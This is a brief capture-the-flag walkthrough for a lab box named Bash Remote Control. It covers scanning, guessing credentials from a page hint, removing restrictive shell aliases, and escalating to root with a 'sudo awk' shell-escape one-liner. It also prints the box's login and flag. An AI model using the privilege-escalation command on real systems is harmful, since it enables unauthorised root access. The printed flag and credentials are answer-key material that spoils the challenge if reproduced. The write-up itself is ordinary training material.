# Bash Remote control

## Intro

Hello guys,

This is the official writeup of the box Bash Remote Control.

Let's get started.

## Recon


**Rustscan**
```
rustscan yourip
```
*Output*
```
IP:22
IP:80
```
**Viewing the Server**
When we go to the server, we are greeted with a meme guy and when we look at the source, we see an html comment
```
<!-- memes and hacking -->
```

## Gaining Access
The username and password are memes:hacking

## User.txt(user_flag.sh is a trap)

Many commands are locked... We can unlock them by typing
```
nano .bashrc
```

And remove the aliases.
Then we logouut and login again...
Then
```
cat .profile
```


We find
```
flag{b45h_ru135}
```

## Privelege Esc.

Using the GTFO bins link...
https://gtfobins.github.io/gtfobins/awk/

We can use:

```
sudo awk 'BEGIN {system("/bin/sh")}'
```

OR

```
sudo awk 'BEGIN {system("/bin/bash")}'
```

## Root.txt
```
cat .flag
```

# THE END
